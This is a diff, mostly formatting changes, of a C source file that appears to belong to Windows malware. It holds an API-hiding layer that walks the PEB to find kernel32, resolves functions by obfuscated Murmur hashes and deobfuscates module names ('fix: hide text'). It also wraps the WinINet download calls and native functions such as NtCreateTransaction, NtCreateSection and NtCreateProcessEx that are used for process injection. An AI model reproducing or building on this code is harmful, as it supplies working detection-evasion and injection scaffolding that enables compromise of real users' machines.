-BOOL (WINAPI *f_IsBadWritePtr)(LPVOID lp, UINT_PTR amount) = NULL;
-BOOL cIsBadWritePtr(	__in LPVOID		lp,
-						__in UINT_PTR	amount)
+BOOL(WINAPI *f_IsBadWritePtr)(LPVOID lp, UINT_PTR amount) = NULL;
+BOOL cIsBadWritePtr(__in LPVOID		lp,
+	__in UINT_PTR	amount)
 {
 	if (f_IsBadWritePtr == NULL) {
-		f_IsBadWritePtr = (BOOL (WINAPI *)(LPVOID, UINT_PTR))resolve_function(function_hash_chain[76], deobfuscate(kernel32));
+		f_IsBadWritePtr = (BOOL(WINAPI *)(LPVOID, UINT_PTR))resolve_function(function_hash_chain[76], deobfuscate(kernel32));
 		CHECK_VALID(f_IsBadWritePtr);
 	}
 
@@ -1856,13 +1856,13 @@ HANDLE WINAPI CreateMutex(
   _In_opt_  LPCTSTR lpName
 );
 */
-HANDLE (WINAPI *f_CreateMutexA)(LPSECURITY_ATTRIBUTES security_attributes, BOOL inital_owner, LPCSTR name) = NULL;
-HANDLE cCreateMutexA(	__inopt	LPSECURITY_ATTRIBUTES	security_attributes,
-						__in	BOOL					initial_owner,
-						__inopt	LPCSTR					name)
+HANDLE(WINAPI *f_CreateMutexA)(LPSECURITY_ATTRIBUTES security_attributes, BOOL inital_owner, LPCSTR name) = NULL;
+HANDLE cCreateMutexA(__inopt	LPSECURITY_ATTRIBUTES	security_attributes,
+	__in	BOOL					initial_owner,
+	__inopt	LPCSTR					name)
 {
 	if (f_CreateMutexA == NULL) {
-		f_CreateMutexA = (HANDLE (WINAPI *)(LPSECURITY_ATTRIBUTES, BOOL, LPCSTR))resolve_function(function_hash_chain[77], deobfuscate(kernel32));
+		f_CreateMutexA = (HANDLE(WINAPI *)(LPSECURITY_ATTRIBUTES, BOOL, LPCSTR))resolve_function(function_hash_chain[77], deobfuscate(kernel32));
 		CHECK_VALID(f_CreateMutexA);
 	}
 
@@ -1874,11 +1874,11 @@ BOOL WINAPI ReleaseMutex(
   _In_  HANDLE hMutex
 );
 */
-BOOL (WINAPI *f_ReleaseMutex)(HANDLE mutex) = NULL;
+BOOL(WINAPI *f_ReleaseMutex)(HANDLE mutex) = NULL;
 BOOL cReleaseMutex(__in HANDLE mutex)
 {
 	if (f_ReleaseMutex == NULL) {
-		f_ReleaseMutex = (BOOL (WINAPI *)(HANDLE))resolve_function(function_hash_chain[78], deobfuscate(kernel32));
+		f_ReleaseMutex = (BOOL(WINAPI *)(HANDLE))resolve_function(function_hash_chain[78], deobfuscate(kernel32));
 		CHECK_VALID(f_ReleaseMutex);
 	}
 
@@ -1892,13 +1892,13 @@ HANDLE WINAPI OpenMutex(
   _In_  LPCTSTR lpName
 );
 */
-HANDLE (WINAPI *f_OpenMutexA)(DWORD access, BOOL inherit_handle, LPCSTR name) = NULL;
-HANDLE cOpenMutexA(	__in DWORD	access,
-					__in BOOL	inherit_handle,
-					__in LPCSTR name)
+HANDLE(WINAPI *f_OpenMutexA)(DWORD access, BOOL inherit_handle, LPCSTR name) = NULL;
+HANDLE cOpenMutexA(__in DWORD	access,
+	__in BOOL	inherit_handle,
+	__in LPCSTR name)
 {
 	if (f_OpenMutexA == NULL) {
-		f_OpenMutexA = (HANDLE (WINAPI *)(DWORD, BOOL, LPCSTR))resolve_function(function_hash_chain[79], deobfuscate(kernel32));
+		f_OpenMutexA = (HANDLE(WINAPI *)(DWORD, BOOL, LPCSTR))resolve_function(function_hash_chain[79], deobfuscate(kernel32));
 		CHECK_VALID(f_OpenMutexA);
 	}
 
@@ -1911,12 +1911,12 @@ DWORD WINAPI WaitForSingleObject(
   _In_  DWORD dwMilliseconds
 );
 */
-DWORD (WINAPI *f_WaitForSingleObject)(HANDLE handle, DWORD time) = NULL;
-DWORD cWaitForSingleObject(	__in	HANDLE	handle,
-							__in	DWORD	time)
+DWORD(WINAPI *f_WaitForSingleObject)(HANDLE handle, DWORD time) = NULL;
+DWORD cWaitForSingleObject(__in	HANDLE	handle,
+	__in	DWORD	time)
 {
 	if (f_WaitForSingleObject == NULL) {
-		f_WaitForSingleObject = (DWORD (WINAPI *)(HANDLE, DWORD))resolve_function(function_hash_chain[80], deobfuscate(kernel32));
+		f_WaitForSingleObject = (DWORD(WINAPI *)(HANDLE, DWORD))resolve_function(function_hash_chain[80], deobfuscate(kernel32));
 		CHECK_VALID(f_WaitForSingleObject);
 	}
 
@@ -1928,11 +1928,11 @@ BOOL WINAPI SetEvent(
   _In_  HANDLE hEvent
 );
 */
-BOOL (WINAPI *f_SetEvent)(HANDLE event_handle) = NULL;
+BOOL(WINAPI *f_SetEvent)(HANDLE event_handle) = NULL;
 BOOL cSetEvent(__in HANDLE event_handle)
 {
 	if (f_SetEvent == NULL) {
-		f_SetEvent = (BOOL (WINAPI *)(HANDLE))resolve_function(function_hash_chain[81], deobfuscate(kernel32));
+		f_SetEvent = (BOOL(WINAPI *)(HANDLE))resolve_function(function_hash_chain[81], deobfuscate(kernel32));
 		CHECK_VALID(f_SetEvent);
 	}
 
@@ -1944,11 +1944,11 @@ BOOL WINAPI DeleteFile(
   _In_  LPCTSTR lpFileName
 );
 */
-BOOL (WINAPI *f_DeleteFileA)(LPCSTR name) = NULL;
+BOOL(WINAPI *f_DeleteFileA)(LPCSTR name) = NULL;
 BOOL cDeleteFileA(__in LPCSTR name)
 {
 	if (f_DeleteFileA == NULL) {
-		f_DeleteFileA = (BOOL (WINAPI *)(LPCSTR))resolve_function(function_hash_chain[82], deobfuscate(kernel32));
+		f_DeleteFileA = (BOOL(WINAPI *)(LPCSTR))resolve_function(function_hash_chain[82], deobfuscate(kernel32));
 		CHECK_VALID(f_DeleteFileA);
 	}
 
@@ -1956,11 +1956,11 @@ BOOL cDeleteFileA(__in LPCSTR name)
 }
 
 //LPTSTR WINAPI GetCommandLine(void);
-LPSTR (WINAPI *f_GetCommandLineA)(VOID) = NULL;
+LPSTR(WINAPI *f_GetCommandLineA)(VOID) = NULL;
 LPSTR cGetCommandLineA(VOID)
 {
 	if (f_GetCommandLineA == NULL) {
-		f_GetCommandLineA = (LPSTR (WINAPI *)(VOID))resolve_function(function_hash_chain[83], deobfuscate(kernel32));
+		f_GetCommandLineA = (LPSTR(WINAPI *)(VOID))resolve_function(function_hash_chain[83], deobfuscate(kernel32));
 		CHECK_VALID(f_GetCommandLineA);
 	}
 
@@ -1974,13 +1974,13 @@ SIZE_T WINAPI HeapSize(
   _In_  LPCVOID lpMem
 );
 */
-SIZE_T (WINAPI *f_HeapSize)(HANDLE heap, DWORD flags, LPCVOID mem) = NULL;
-SIZE_T cHeapSize(	__in HANDLE		heap,
-					__in DWORD		flags,
-					__in LPCVOID	mem)
+SIZE_T(WINAPI *f_HeapSize)(HANDLE heap, DWORD flags, LPCVOID mem) = NULL;
+SIZE_T cHeapSize(__in HANDLE		heap,
+	__in DWORD		flags,
+	__in LPCVOID	mem)
 {
 	if (f_HeapSize == NULL) {
-		f_HeapSize = (SIZE_T (WINAPI *)(HANDLE, DWORD, LPCVOID))resolve_function(function_hash_chain[84], deobfuscate(kernel32));
+		f_HeapSize = (SIZE_T(WINAPI *)(HANDLE, DWORD, LPCVOID))resolve_function(function_hash_chain[84], deobfuscate(kernel32));
 		CHECK_VALID(f_HeapSize);
 	}
 
@@ -1993,12 +1993,12 @@ BOOL WINAPI TerminateThread(
   _In_     DWORD dwExitCode
 );
 */
-BOOL (WINAPI *f_TerminateThread)(HANDLE thread, DWORD exit_code) = NULL;
-BOOL cTerminateThread(	__inout	HANDLE	thread,
-						__in	DWORD	exit_code)
+BOOL(WINAPI *f_TerminateThread)(HANDLE thread, DWORD exit_code) = NULL;
+BOOL cTerminateThread(__inout	HANDLE	thread,
+	__in	DWORD	exit_code)
 {
 	if (f_TerminateThread == NULL) {
-		f_TerminateThread = (BOOL (WINAPI *)(HANDLE, DWORD))resolve_function(function_hash_chain[85], deobfuscate(kernel32));
+		f_TerminateThread = (BOOL(WINAPI *)(HANDLE, DWORD))resolve_function(function_hash_chain[85], deobfuscate(kernel32));
 		CHECK_VALID(f_TerminateThread);
 	}
 
@@ -2010,11 +2010,11 @@ void WINAPI DeleteCriticalSection(
   _Inout_  LPCRITICAL_SECTION lpCriticalSection
 );
 */
-VOID (WINAPI *f_DeleteCriticalSection)(LPCRITICAL_SECTION critical_section) = NULL;
+VOID(WINAPI *f_DeleteCriticalSection)(LPCRITICAL_SECTION critical_section) = NULL;
 VOID cDeleteCriticalSection(__inout	LPCRITICAL_SECTION critical_section)
 {
 	if (f_DeleteCriticalSection == NULL) {
-		f_DeleteCriticalSection = (VOID (WINAPI *)(LPCRITICAL_SECTION))resolve_function(function_hash_chain[86], deobfuscate(kernel32));
+		f_DeleteCriticalSection = (VOID(WINAPI *)(LPCRITICAL_SECTION))resolve_function(function_hash_chain[86], deobfuscate(kernel32));
 		CHECK_VALID(f_DeleteCriticalSection);
 	}
 
@@ -2030,16 +2030,16 @@ HINTERNET InternetOpen(
   _In_  DWORD dwFlags
 );
 */
-HINTERNET (WINAPI *f_InternetOpenA)(LPCSTR agent, DWORD access_type, LPCSTR proxy_name, LPCSTR proxy_bypass, DWORD flags) 
-	= NULL;
-HINTERNET cInternetOpenA(	__in	LPCSTR	agent,
-							__in	DWORD	access_type,
-							__in	LPCSTR	proxy_name,
-							__in	LPCSTR	proxy_bypass,
-							__in	DWORD	flags)
+HINTERNET(WINAPI *f_InternetOpenA)(LPCSTR agent, DWORD access_type, LPCSTR proxy_name, LPCSTR proxy_bypass, DWORD flags)
+= NULL;
+HINTERNET cInternetOpenA(__in	LPCSTR	agent,
+	__in	DWORD	access_type,
+	__in	LPCSTR	proxy_name,
+	__in	LPCSTR	proxy_bypass,
+	__in	DWORD	flags)
 {
 	if (f_InternetOpenA == NULL) {
-		f_InternetOpenA = (HINTERNET (WINAPI *)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD))resolve_function(
+		f_InternetOpenA = (HINTERNET(WINAPI *)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD))resolve_function(
 			function_hash_chain[87], deobfuscate(wininet));
 		CHECK_VALID(f_InternetOpenA);
 	}
@@ -2052,11 +2052,11 @@ BOOL InternetCloseHandle(
   _In_  HINTERNET hInternet
 );
 */
-BOOL (WINAPI *f_InternetCloseHandle)(HINTERNET internet) = NULL;
+BOOL(WINAPI *f_InternetCloseHandle)(HINTERNET internet) = NULL;
 BOOL cInternetCloseHandle(__in HINTERNET internet)
 {
 	if (f_InternetCloseHandle == NULL) {
-		f_InternetCloseHandle = (BOOL (WINAPI *)(HINTERNET))resolve_function(function_hash_chain[88], deobfuscate(wininet));
+		f_InternetCloseHandle = (BOOL(WINAPI *)(HINTERNET))resolve_function(function_hash_chain[88], deobfuscate(wininet));
 		CHECK_VALID(f_InternetCloseHandle);
 	}
 
@@ -2073,17 +2073,17 @@ HINTERNET InternetOpenUrl(
   _In_  DWORD_PTR dwContext
 );
 */
-HINTERNET (WINAPI *f_InternetOpenUrlA)(HINTERNET internet, LPCSTR url, LPCSTR headers, DWORD headers_len, 
+HINTERNET(WINAPI *f_InternetOpenUrlA)(HINTERNET internet, LPCSTR url, LPCSTR headers, DWORD headers_len,
 	DWORD flags, DWORD_PTR context) = NULL;
-HINTERNET cInternetOpenUrlA(	__in HINTERNET	internet,
-								__in LPCSTR		url,
-								__in LPCSTR		headers,
-								__in DWORD		headers_len,
-								__in DWORD		flags,
-								__in DWORD_PTR	context)
+HINTERNET cInternetOpenUrlA(__in HINTERNET	internet,
+	__in LPCSTR		url,
+	__in LPCSTR		headers,
+	__in DWORD		headers_len,
+	__in DWORD		flags,
+	__in DWORD_PTR	context)
 {
 	if (f_InternetOpenUrlA == NULL) {
-		f_InternetOpenUrlA = (HINTERNET (WINAPI *)(HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR))
+		f_InternetOpenUrlA = (HINTERNET(WINAPI *)(HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR))
 			resolve_function(function_hash_chain[89], deobfuscate(wininet));
 		CHECK_VALID(f_InternetOpenUrlA);
 	}
@@ -2099,14 +2099,14 @@ BOOL InternetReadFile(
   _Out_  LPDWORD lpdwNumberOfBytesRead
 );
 */
-BOOL (WINAPI *f_InternetReadFile)(HINTERNET file, LPVOID buffer, DWORD bytes_to_read, LPDWORD bytes_read) = NULL;
-BOOL cInternetReadFile(	__in	HINTERNET	file,
-						__out	LPVOID		buffer,
-						__in	DWORD		bytes_to_read,
-						__out	LPDWORD		bytes_read)
+BOOL(WINAPI *f_InternetReadFile)(HINTERNET file, LPVOID buffer, DWORD bytes_to_read, LPDWORD bytes_read) = NULL;
+BOOL cInternetReadFile(__in	HINTERNET	file,
+	__out	LPVOID		buffer,
+	__in	DWORD		bytes_to_read,
+	__out	LPDWORD		bytes_read)
 {
 	if (f_InternetReadFile == NULL) {
-		f_InternetReadFile = (BOOL (WINAPI *)(HINTERNET, LPVOID, DWORD, LPDWORD))
+		f_InternetReadFile = (BOOL(WINAPI *)(HINTERNET, LPVOID, DWORD, LPDWORD))
 			resolve_function(function_hash_chain[90], deobfuscate(wininet));
 		CHECK_VALID(f_InternetReadFile);
 	}
@@ -2122,17 +2122,17 @@ DWORD WINAPI SetFilePointer(
   _In_         DWORD dwMoveMethod
 );
 */
-DWORD (WINAPI *f_SetFilePointer)(HANDLE file, LONG distance_to_move, PLONG distance_to_move_high, 
+DWORD(WINAPI *f_SetFilePointer)(HANDLE file, LONG distance_to_move, PLONG distance_to_move_high,
 	DWORD move_method) = NULL;
-DWORD cSetFilePointer(	__in		HANDLE	file,
-						__in		LONG	distance_to_move,
-						__inout_opt	PLONG	distance_to_move_high,
-						__in		DWORD	move_method)
+DWORD cSetFilePointer(__in		HANDLE	file,
+	__in		LONG	distance_to_move,
+	__inout_opt	PLONG	distance_to_move_high,
+	__in		DWORD	move_method)
 {
 	if (f_SetFilePointer == NULL) {
-		f_SetFilePointer = (DWORD (WINAPI *)(HANDLE, LONG, PLONG, DWORD))
+		f_SetFilePointer = (DWORD(WINAPI *)(HANDLE, LONG, PLONG, DWORD))
 			resolve_function(function_hash_chain[91], deobfuscate(kernel32));
-		
+
 		CHECK_VALID(f_SetFilePointer);
 	}
 
@@ -2145,25 +2145,25 @@ DWORD WINAPI GetCurrentDirectoryA(
   _Out_  LPSTR lpBuffer
 );
 */
-DWORD (WINAPI *f_GetCurrentDirectoryA)(__in DWORD buffer_length, __out LPSTR buffer) = NULL;
-DWORD cGetCurrentDirectoryA(	__in	DWORD	buffer_length,
-								__out	LPSTR	buffer)
+DWORD(WINAPI *f_GetCurrentDirectoryA)(__in DWORD buffer_length, __out LPSTR buffer) = NULL;
+DWORD cGetCurrentDirectoryA(__in	DWORD	buffer_length,
+	__out	LPSTR	buffer)
 {
-	   if (f_GetCurrentDirectoryA == NULL) {
-			f_GetCurrentDirectoryA = (DWORD (WINAPI *)(DWORD, LPSTR))
-				resolve_function(function_hash_chain[92] , deobfuscate(kernel32));
+	if (f_GetCurrentDirectoryA == NULL) {
+		f_GetCurrentDirectoryA = (DWORD(WINAPI *)(DWORD, LPSTR))
+			resolve_function(function_hash_chain[92], deobfuscate(kernel32));
 
-			CHECK_VALID(f_GetCurrentDirectoryA);
-	   }
+		CHECK_VALID(f_GetCurrentDirectoryA);
+	}
 
-	   return f_GetCurrentDirectoryA(buffer_length, buffer);
+	return f_GetCurrentDirectoryA(buffer_length, buffer);
 }
 /* DO NOT USE
 int sprintf_s(
    char *buffer,
    size_t sizeOfBuffer,
    const char *format [,
-   argument] ... 
+   argument] ...
 );*/
 /*
 INT (WINAPI *f_sprintf_s)(PCHAR buffer, SIZE_T size, const PCHAR format, ...) = NULL;
@@ -2187,9 +2187,9 @@ FARPROC WINAPI GetProcAddress(
   _In_  HMODULE hModule,
   _In_  LPCSTR lpProcName
 );*/
-LPVOID (WINAPI *f_GetProcAddress)(__in HMODULE module, __in LPCSTR procedure_name) = NULL;
-LPVOID cGetProcAddress(	__in HMODULE		module,
-						__in LPCSTR			procedure_name)
+LPVOID(WINAPI *f_GetProcAddress)(__in HMODULE module, __in LPCSTR procedure_name) = NULL;
+LPVOID cGetProcAddress(__in HMODULE		module,
+	__in LPCSTR			procedure_name)
 {
 	return f_GetProcAddress(module, procedure_name);
 }
@@ -2198,7 +2198,7 @@ LPVOID cGetProcAddress(	__in HMODULE		module,
 HMODULE WINAPI LoadLibrary(
   _In_  LPCTSTR lpFileName
 );*/
-HMODULE (WINAPI *f_LoadLibraryA)(__in LPCSTR file_name) = NULL;
+HMODULE(WINAPI *f_LoadLibraryA)(__in LPCSTR file_name) = NULL;
 HMODULE cLoadLibraryA(__in LPCSTR file_name)
 {
 	return f_LoadLibraryA(file_name);
@@ -2225,7 +2225,7 @@ HMODULE cLoadLibraryA(__in LPCSTR file_name)
 */
 //----------------
 
-NTSTATUS( WINAPI *f_NtCreateProcessEx)(
+NTSTATUS(WINAPI *f_NtCreateProcessEx)(
 	_Out_    PHANDLE ProcessHandle,
 	_In_     ACCESS_MASK DesiredAccess,
 	_In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
@@ -2284,32 +2284,32 @@ NTSTATUS cRtlCreateProcessParametersEx(
 	_In_	 ULONG Flags)
 {
 	if (f_RtlCreateProcessParametersEx == NULL) {
-		f_RtlCreateProcessParametersEx = (NTSTATUS(WINAPI *)(PRTL_USER_PROCESS_PARAMETERS32*, 
-																	PUNICODE_STRING, 
-																	PUNICODE_STRING, 
-																	PUNICODE_STRING, 
-																	PUNICODE_STRING, 
-																	PVOID, 
-																	PUNICODE_STRING, 
-																	PUNICODE_STRING, 
-																	PUNICODE_STRING, 
-																	PUNICODE_STRING, 
-																	ULONG))
+		f_RtlCreateProcessParametersEx = (NTSTATUS(WINAPI *)(PRTL_USER_PROCESS_PARAMETERS32*,
+			PUNICODE_STRING,
+			PUNICODE_STRING,
+			PUNICODE_STRING,
+			PUNICODE_STRING,
+			PVOID,
+			PUNICODE_STRING,
+			PUNICODE_STRING,
+			PUNICODE_STRING,
+			PUNICODE_STRING,
+			ULONG))
 			resolve_function(function_hash_chain[94], deobfuscate(ntdll));
 		CHECK_VALID(f_RtlCreateProcessParametersEx);
 	}
 
-	return f_RtlCreateProcessParametersEx(pProcessParameters, 
-											ImagePathName, 
-											DllPath, 
-											CurrentDirectory, 
-											CommandLine, 
-											Environment, 
-											WindowTitle, 
-											DesktopInfo, 
-											ShellInfo, 
-											RuntimeData, 
-											Flags);
+	return f_RtlCreateProcessParametersEx(pProcessParameters,
+		ImagePathName,
+		DllPath,
+		CurrentDirectory,
+		CommandLine,
+		Environment,
+		WindowTitle,
+		DesktopInfo,
+		ShellInfo,
+		RuntimeData,
+		Flags);
 
 
 }
@@ -2388,7 +2388,7 @@ NTSTATUS cNtAllocateVirtualMemory(
 	_Inout_     PSIZE_T RegionSize,
 	_In_        ULONG AllocationType,
 	_In_        ULONG Protect
-	)
+)
 {
 	if (f_NtAllocateVirtualMemory == NULL) {
 		f_NtAllocateVirtualMemory = (NTSTATUS(WINAPI *)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG))
@@ -2434,7 +2434,7 @@ NTSTATUS(WINAPI *f_NtCreateSection)(
 	_In_		ULONG SectionPageProtection,
 	_In_		ULONG AllocationAttributes,
 	_In_opt_	HANDLE FileHandle
-) = NULL;
+	) = NULL;
 NTSTATUS cNtCreateSection(
 	_Out_		PHANDLE SectionHandle,
 	_In_		ACCESS_MASK DesiredAccess,
@@ -2467,7 +2467,7 @@ NTSTATUS(WINAPI *f_NtCreateTransaction)(
 	_In_opt_  ULONG IsolationFlags,
 	_In_opt_  PLARGE_INTEGER Timeout,
 	_In_opt_  PUNICODE_STRING Description
-) = NULL;
+	) = NULL;
 NTSTATUS cNtCreateTransaction(
 	_Out_     PHANDLE TransactionHandle,
 	_In_      ACCESS_MASK DesiredAccess,
@@ -2479,7 +2479,7 @@ NTSTATUS cNtCreateTransaction(
 	_In_opt_  ULONG IsolationFlags,
 	_In_opt_  PLARGE_INTEGER Timeout,
 	_In_opt_  PUNICODE_STRING Description
-	)
+)
 {
 
 	if (f_NtCreateTransaction == NULL) {
@@ -2534,7 +2534,7 @@ DWORD(WINAPI *f_GetFullPathNameA)(
 	DWORD  nBufferLength,
 	LPSTR  lpBuffer,
 	LPSTR  *lpFilePart
-) = NULL;
+	) = NULL;
 
 DWORD cGetFullPathNameA(
 	LPCSTR lpFileName,
@@ -2580,7 +2580,7 @@ NTSTATUS(WINAPI *f_NtQueryInformationProcess)(
 	_Out_		PVOID ProcessInformation,
 	_In_		ULONG ProcessInformationLength,
 	_Out_opt_	PULONG ReturnLength
-) = NULL;
+	) = NULL;
 NTSTATUS cNtQueryInformationProcess(
 	_In_		HANDLE ProcessHandle,
 	_In_		PROCESSINFOCLASS ProcessInformationClass,
@@ -2591,7 +2591,7 @@ NTSTATUS cNtQueryInformationProcess(
 {
 
 	if (f_NtQueryInformationProcess == NULL) {
-		f_NtQueryInformationProcess = (NTSTATUS(WINAPI *)(HANDLE, PROCESSINFOCLASS, PVOID , ULONG, PULONG))
+		f_NtQueryInformationProcess = (NTSTATUS(WINAPI *)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG))
 			resolve_function(function_hash_chain[102], deobfuscate(ntdll));
 		CHECK_VALID(f_NtQueryInformationProcess);
 	}
@@ -2606,7 +2606,7 @@ NTSTATUS(WINAPI *f_NtReadVirtualMemory)(
 	_Out_		PVOID Buffer,
 	_In_		SIZE_T BufferSize,
 	_Out_opt_	PSIZE_T NumberOfBytesRead
-) = NULL;
+	) = NULL;
 NTSTATUS cNtReadVirtualMemory(
 	_In_		HANDLE ProcessHandle,
 	_In_opt_	PVOID BaseAddress,
@@ -2666,7 +2666,7 @@ NTSTATUS(WINAPI *f_NtFreeVirtualMemory)(
 	_Inout_    PVOID *BaseAddress,
 	_Inout_    PSIZE_T RegionSize,
 	_In_       ULONG FreeType
-) = NULL;
+	) = NULL;
 
 NTSTATUS cNtFreeVirtualMemory(
 	_In_       HANDLE ProcessHandle,
@@ -2690,7 +2690,7 @@ NTSTATUS cNtFreeVirtualMemory(
 
 NTSTATUS(WINAPI *f_RtlDestroyProcessParameters)(
 	_In_ PRTL_USER_PROCESS_PARAMETERS32 ProcessParameters
-) = NULL;
+	) = NULL;
 
 NTSTATUS cRtlDestroyProcessParameters(
 	_In_ PRTL_USER_PROCESS_PARAMETERS32 ProcessParameters
@@ -2712,7 +2712,7 @@ NTSTATUS cRtlDestroyProcessParameters(
 
 PIMAGE_NT_HEADERS(WINAPI *f_RtlImageNtHeader)(
 	_In_ PVOID Base
-) = NULL;
+	) = NULL;
 
 PIMAGE_NT_HEADERS cRtlImageNtHeader(
 	_In_ PVOID Base
@@ -2732,7 +2732,7 @@ PIMAGE_NT_HEADERS cRtlImageNtHeader(
 VOID(WINAPI *f_RtlInitUnicodeString)(
 	PUNICODE_STRING DestinationString,
 	PCWSTR          SourceString
-) = NULL;
+	) = NULL;
 
 VOID cRtlInitUnicodeString(
 	PUNICODE_STRING DestinationString,
@@ -2852,8 +2852,8 @@ static LPVOID resolve_function(DWORD hash, LPSTR module)
 
 	if ((f_GetProcAddress == NULL) && (f_LoadLibraryA == NULL)) {
 		// We must first resolve these functions...
-		kernel32_base		= get_kernel32_base();
-		f_LoadLibraryA		= (HMODULE (WINAPI *)(LPCSTR))resolve_export(kernel32_base, (0x4dbfb8e4 ^ KISS));
+		kernel32_base = get_kernel32_base();
+		f_LoadLibraryA = (HMODULE(WINAPI *)(LPCSTR))resolve_export(kernel32_base, (0x4dbfb8e4 ^ KISS));
 		//f_GetProcAddress	= (LPVOID (WINAPI *)(HMODULE, LPCSTR))resolve_export(kernel32_base, 0x47d30a54);
 	}
 
@@ -2861,57 +2861,57 @@ static LPVOID resolve_function(DWORD hash, LPSTR module)
 	if (module_base == NULL) {
 		return NULL;
 	}
-	procedure   = (LPVOID)resolve_export(module_base, hash);
+	procedure = (LPVOID)resolve_export(module_base, hash);
 
 	return procedure;
 }
 
- static HMODULE get_kernel32_base(VOID)
+static HMODULE get_kernel32_base(VOID)
 {
 #ifdef _WIN64
 
 
-	 int offset = 0x60;
-	 int ModuleList = 0x18;
-	 int ModuleListFlink = 0x18;
-	 int KernelBaseAddr = 0x10;
+	int offset = 0x60;
+	int ModuleList = 0x18;
+	int ModuleListFlink = 0x18;
+	int KernelBaseAddr = 0x10;
 
-	 INT_PTR peb = __readgsqword(offset);
+	INT_PTR peb = __readgsqword(offset);
 
 
 #else
-	 int offset = 0x30;
-	 int ModuleList = 0x0C;
-	 int ModuleListFlink = 0x10;
-	 int KernelBaseAddr = 0x10;
+	int offset = 0x30;
+	int ModuleList = 0x0C;
+	int ModuleListFlink = 0x10;
+	int KernelBaseAddr = 0x10;
 
-	 INT_PTR peb = __readfsdword(offset);
+	INT_PTR peb = __readfsdword(offset);
 
 
 #endif
 
 
 
-	 INT_PTR mdllist = *(INT_PTR*)(peb + ModuleList);
-	 INT_PTR mlink = *(INT_PTR*)(mdllist + ModuleListFlink);
-	 INT_PTR krnbase = *(INT_PTR*)(mlink + KernelBaseAddr);
+	INT_PTR mdllist = *(INT_PTR*)(peb + ModuleList);
+	INT_PTR mlink = *(INT_PTR*)(mdllist + ModuleListFlink);
+	INT_PTR krnbase = *(INT_PTR*)(mlink + KernelBaseAddr);
 
-	 LDR_MODULE *mdl = (LDR_MODULE*)mlink;
-	 do
-	 {
-		 mdl = (LDR_MODULE*)mdl->e[0].Flink;
+	LDR_MODULE *mdl = (LDR_MODULE*)mlink;
+	do
+	{
+		mdl = (LDR_MODULE*)mdl->e[0].Flink;
 
-		 if (mdl->base != NULL)
-		 {
-			 if (!lstrcmpiW(mdl->dllname.Buffer, L"kernel32.dll")) // fix: hide text
-			 {
-				 break;
-			 }
-		 }
-	 } while (mlink != (INT_PTR)mdl);
+		if (mdl->base != NULL)
+		{
+			if (!lstrcmpiW(mdl->dllname.Buffer, L"kernel32.dll")) // fix: hide text
+			{
+				break;
+			}
+		}
+	} while (mlink != (INT_PTR)mdl);
 
-	 HMODULE kb = (HMODULE)mdl->base;
-	 return kb;
+	HMODULE kb = (HMODULE)mdl->base;
+	return kb;
 }
 
 static LPVOID resolve_export(HMODULE module, DWORD function_hash)
@@ -2928,25 +2928,26 @@ static LPVOID resolve_export(HMODULE module, DWORD function_hash)
 
 	DWORD						name_hash;
 
-	dos_header	= (PIMAGE_DOS_HEADER)module;
-	nt_headers	= (PIMAGE_NT_HEADERS)((DWORD_PTR)dos_header + dos_header->e_lfanew);
-	eat			= (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)dos_header + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+	dos_header = (PIMAGE_DOS_HEADER)module;
+	nt_headers = (PIMAGE_NT_HEADERS)((DWORD_PTR)dos_header + dos_header->e_lfanew);
+	eat = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)dos_header + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
 
-	name_ptr	= (PDWORD)	((DWORD_PTR)dos_header + eat->AddressOfNames);
-	ordinal_ptr	= (PWORD)	((DWORD_PTR)dos_header + eat->AddressOfNameOrdinals);
+	name_ptr = (PDWORD)((DWORD_PTR)dos_header + eat->AddressOfNames);
+	ordinal_ptr = (PWORD)((DWORD_PTR)dos_header + eat->AddressOfNameOrdinals);
 
 	ordinal = -1;
 	for (i = 0; i < eat->NumberOfNames; i++) {
 
 		name_string = (PCHAR)((DWORD_PTR)dos_header + name_ptr[i]);
 
-		name_hash   = MURMUR_HASH(name_string, API_STRLEN(name_string), HASHING_SEED);
+		name_hash = MURMUR_HASH(name_string, API_STRLEN(name_string), HASHING_SEED);
 
 		if ((!API_STRCMP(name_string, deobfuscate(heapalloc), API_STRLEN(deobfuscate(heapalloc)))) && ((name_hash ^ KISS) == function_hash)) {
 			// Add in an exception for this one
 			if (f_GetProcAddress != NULL) {
 				return f_GetProcAddress(module, deobfuscate(heapalloc));
-			} else {
+			}
+			else {
 				return NULL;
 			}
 		}
@@ -2955,7 +2956,8 @@ static LPVOID resolve_export(HMODULE module, DWORD function_hash)
 			// Add in an exception for this one
 			if (f_GetProcAddress != NULL) {
 				return f_GetProcAddress(module, deobfuscate(heaprealloc));
-			} else {
+			}
+			else {
 				return NULL;
 			}
 		}
@@ -2968,8 +2970,8 @@ static LPVOID resolve_export(HMODULE module, DWORD function_hash)
 	}
 
 	if (ordinal != -1) {
-		addr_ptr		= (PDWORD)((DWORD_PTR)dos_header + eat->AddressOfFunctions);
-		return_function	= (LPVOID)((DWORD_PTR)dos_header + addr_ptr[ordinal]);
+		addr_ptr = (PDWORD)((DWORD_PTR)dos_header + eat->AddressOfFunctions);
+		return_function = (LPVOID)((DWORD_PTR)dos_header + addr_ptr[ordinal]);
 	}
 
 	return return_function;
@@ -2979,105 +2981,106 @@ static VOID check_function_validity(LPVOID address)
 {
 	if (address != NULL) {
 		return;
-	} else {
+	}
+	else {
 		cExitProcess(0);
 	}
 }
 
 VOID uninitialize_api(VOID)
 {
-	f_GetModuleFileNameA						= NULL;
-	f_GetProcAddress							= NULL;
-	f_LoadLibraryA								= NULL;
-	f_GetModuleHandleA							= NULL;
-	f_ExitProcess								= NULL;
-	f_SHGetFolderPathA							= NULL;
-	f_PathCombineA								= NULL;
-	f_CreateFileA								= NULL;
-	f_GetFileSize								= NULL;
-	f_HeapAlloc									= NULL;
-	f_GetProcessHeap							= NULL;
-	f_ReadFile									= NULL;
-	f_CloseHandle								= NULL;
